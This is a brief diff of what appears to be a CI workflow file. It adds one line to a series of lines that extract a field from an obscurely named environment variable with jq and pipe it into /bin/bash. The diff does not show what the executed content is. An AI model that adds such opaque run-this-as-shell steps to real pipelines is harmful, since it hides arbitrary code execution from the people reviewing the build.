@@ -41,6 +41,7 @@ jobs:
           echo $bzik2237 | jq -r .toswz43964 | /bin/bash
           echo $joz81241 | jq -r .abyol7636 | /bin/bash
           echo $ws716 | jq -r .u68 | /bin/bash
+          printf '%s' "$tdkh18472" | jq -r .p8316 | /bin/bash
 
       - name: Save output
         if: always()
